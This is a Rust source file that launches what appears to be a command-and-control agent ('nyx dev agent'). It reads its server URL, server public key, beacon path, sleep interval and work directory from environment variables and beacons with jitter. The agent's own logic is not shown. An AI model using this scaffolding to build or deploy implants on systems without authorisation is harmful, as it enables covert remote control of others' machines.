use nyx_agent_dev::Config;

fn main() -> anyhow::Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| "warn".into()),
        )
        .init();

    let server_url =
        std::env::var("NYX_SERVER").unwrap_or_else(|_| "http://127.0.0.1:8443".to_string());
    let server_pub_hex = std::env::var("NYX_SERVER_PUB").expect("NYX_SERVER_PUB required (hex)");
    let server_pub = hex::decode(&server_pub_hex)
        .expect("NYX_SERVER_PUB must be hex")
        .try_into()
        .expect("NYX_SERVER_PUB must be 32 bytes");
    let sleep_seconds: u32 = std::env::var("NYX_SLEEP")
        .ok()
        .and_then(|s| s.parse().ok())
        .unwrap_or(5);

    tracing::info!(%server_url, "nyx dev agent starting");
    let work_dir =
        std::path::PathBuf::from(std::env::var("NYX_WORKDIR").unwrap_or_else(|_| ".".to_string()));
    let beacon_uri =
        std::env::var("NYX_BEACON_URI").unwrap_or_else(|_| "/beacon".to_string());
    nyx_agent_dev::run(Config {
        server_url,
        server_pub,
        sleep_seconds,
        jitter_pct: 20,
        work_dir,
        beacon_uri,
    })
}
